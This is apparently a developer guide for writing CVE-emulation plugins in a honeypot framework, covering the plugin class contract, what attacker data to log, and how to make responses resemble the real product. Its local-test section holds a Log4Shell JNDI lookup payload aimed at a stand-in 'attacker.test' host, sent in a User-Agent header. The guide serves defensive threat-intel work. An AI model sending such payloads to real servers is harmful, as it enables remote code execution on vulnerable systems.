# Adding a new CVE plugin

## TL;DR

```bash
python scripts/add_cve_plugin.py CVE-2025-11111 --service http --product "Fortinet FortiOS"
# edit the generated file
make reload-http
```

## Plugin contract

Every plugin subclasses `honeycore.CVEPlugin` and implements two methods:

```python
from honeycore.plugins import CVEPlugin, PluginContext

class MyCVE(CVEPlugin):
    cve_id   = "CVE-2025-11111"
    product  = "Fortinet FortiOS"
    severity = "critical"

    def matches(self, ctx: PluginContext) -> bool:
        """Cheap predicate. Runs on every request — keep it fast."""
        return ctx.request["path"].startswith("/remote/login")

    def handle(self, ctx: PluginContext):
        """Emulate the exploit response. Must log the attempt."""
        self.log_attempt(ctx, payload=...)
        return HTMLResponse(content="...", status_code=200)
```

## What to log

Call `self.log_attempt(ctx, **extras)` with everything useful for threat intel:

- Extracted callback URLs (for JNDI, SSRF, webhook CVEs)
- Decoded commands (for injection CVEs)
- Authorization headers (for auth-bypass CVEs)
- Full payloads when ≤ a few KB

## Realistic responses

**Why it matters:** If the response is instantly 200 OK to every probe, fingerprinting tools will tag it. Good rules of thumb:

1. Return the **exact status + headers** the real product returns on a successful exploit.
2. Match body content length to what the real product returns (use the `Content-Length` the genuine product emits).
3. Use the `honeycore.Deception.jitter()` method implicitly — the HTTP middleware already calls it for you.
4. Do not include strings like `"honeypot"`, `"cowrie"`, or framework error messages in responses.

## Local test

```bash
# Send a fake Log4Shell probe to the running honeypot
curl -H 'User-Agent: ${jndi:ldap://attacker.test/x}' http://localhost:8080/
# Inspect the captured event
tail -n1 logs/http/http.json | jq
```

## File naming convention

`services/http/plugins/cve_<year>_<id>_<product_slug>.py`

Keep one CVE per file. It makes code review and selective enable/disable trivial.
